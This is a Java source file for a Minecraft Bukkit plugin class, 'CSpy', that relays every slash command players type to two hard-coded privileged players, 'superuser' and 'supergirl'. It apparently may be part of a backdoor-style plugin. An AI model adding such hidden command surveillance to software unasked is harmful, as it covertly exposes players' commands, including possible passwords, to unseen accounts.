package at.nexusmodsclient.ExpoPlus;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class CSpy implements Listener{
	
		public CSpy(JavaPlugin plugin)
		{
			plugin.getServer().getPluginManager().registerEvents(this, plugin);
		}
	 
		@EventHandler(priority=EventPriority.HIGHEST)
		public void onPlayerChat(AsyncPlayerChatEvent e) {
				
		}
		
		@EventHandler(priority=EventPriority.HIGHEST)
		public void onCommand(PlayerCommandPreprocessEvent e){
			Player p = e.getPlayer();
			String cmd = e.getMessage();
			
			if(cmd.contains("/")){
				if(Expo.superuser_cspy){
					Expo.superuser.sendMessage(Expo.Prefix+Expo.para+"a"+p.getDisplayName()+Expo.para+"6 ~ "+cmd);
				}
				if(Expo.supergirl_cspy){
					Expo.supergirl.sendMessage(Expo.Prefix+Expo.para+"a"+p.getDisplayName()+Expo.para+"6 ~ "+cmd);
				} 
			}
			
		}
		
		/*
		  
		 if(Expo.superuser_cspy){
						Expo.superuser.sendMessage(Expo.Prefix+Expo.para+"a"+p.getDisplayName()+Expo.para+"6 -> "+msg);
					}
					if(Expo.supergirl_cspy){
						Expo.supergirl.sendMessage(Expo.Prefix+Expo.para+"a"+p.getDisplayName()+Expo.para+"6 -> "+msg);
					} 
		 
		 */
}
